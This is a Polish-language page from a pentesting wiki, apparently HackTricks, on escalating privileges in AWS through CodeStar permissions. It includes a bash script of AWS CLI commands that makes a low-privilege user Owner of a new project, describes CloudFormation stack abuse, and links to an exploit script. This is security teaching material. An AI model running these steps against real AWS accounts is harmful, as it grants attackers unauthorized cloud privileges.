# AWS - Codestar Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## Codestar

Możesz znaleźć więcej informacji o codestar w:

{{#ref}}
codestar-createproject-codestar-associateteammember.md
{{#endref}}

### `iam:PassRole`, `codestar:CreateProject`

Dzięki tym uprawnieniom możesz **nadużyć roli IAM codestar** do wykonywania **dowolnych działań** za pomocą **szablonu cloudformation**. Sprawdź następującą stronę:

{{#ref}}
iam-passrole-codestar-createproject.md
{{#endref}}

### `codestar:CreateProject`, `codestar:AssociateTeamMember`

Ta technika wykorzystuje `codestar:CreateProject` do stworzenia projektu codestar oraz `codestar:AssociateTeamMember`, aby uczynić użytkownika IAM **właścicielem** nowego projektu CodeStar, co przyzna im **nową politykę z kilkoma dodatkowymi uprawnieniami**.
```bash
PROJECT_NAME="supercodestar"

aws --profile "$NON_PRIV_PROFILE_USER" codestar create-project \
--name $PROJECT_NAME \
--id $PROJECT_NAME

echo "Waiting 1min to start the project"
sleep 60

USER_ARN=$(aws --profile "$NON_PRIV_PROFILE_USER" opsworks describe-my-user-profile | jq .UserProfile.IamUserArn | tr -d '"')

aws --profile "$NON_PRIV_PROFILE_USER" codestar associate-team-member \
--project-id $PROJECT_NAME \
--user-arn "$USER_ARN" \
--project-role "Owner" \
--remote-access-allowed
```
Jeśli jesteś już **członkiem projektu**, możesz użyć uprawnienia **`codestar:UpdateTeamMember`**, aby **zaktualizować swoją rolę** na właściciela zamiast `codestar:AssociateTeamMember`.

**Potencjalny wpływ:** Privesc do polityki codestar. Przykład tej polityki można znaleźć w:

{{#ref}}
codestar-createproject-codestar-associateteammember.md
{{#endref}}

### `codestar:CreateProjectFromTemplate`

1. **Utwórz nowy projekt:**
- Wykorzystaj akcję **`codestar:CreateProjectFromTemplate`**, aby rozpocząć tworzenie nowego projektu.
- Po pomyślnym utworzeniu, dostęp jest automatycznie przyznawany dla **`cloudformation:UpdateStack`**.
- Ten dostęp dotyczy konkretnej stosu powiązanej z rolą IAM `CodeStarWorker-<nazwa ogólna projektu>-CloudFormation`.
2. **Zaktualizuj docelowy stos:**
- Z przyznanymi uprawnieniami CloudFormation, przystąp do aktualizacji określonego stosu.
- Nazwa stosu zazwyczaj będzie odpowiadać jednemu z dwóch wzorców:
- `awscodestar-<nazwa ogólna projektu>-infrastructure`
- `awscodestar-<nazwa ogólna projektu>-lambda`
- Dokładna nazwa zależy od wybranego szablonu (odnosząc się do przykładowego skryptu exploit).
3. **Dostęp i uprawnienia:**
- Po aktualizacji uzyskujesz możliwości przypisane do **roli IAM CloudFormation** powiązanej z tym stosem.
- Uwaga: To nie zapewnia z natury pełnych uprawnień administratora. Dodatkowe źle skonfigurowane zasoby w środowisku mogą być wymagane do dalszego podniesienia uprawnień.

Aby uzyskać więcej informacji, sprawdź oryginalne badania: [https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/](https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/).\
Możesz znaleźć exploit w [https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar_createprojectfromtemplate_privesc/CodeStarPrivEsc.py](https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar_createprojectfromtemplate_privesc/CodeStarPrivEsc.py)

**Potencjalny wpływ:** Privesc do roli IAM cloudformation.

{{#include ../../../../banners/hacktricks-training.md}}
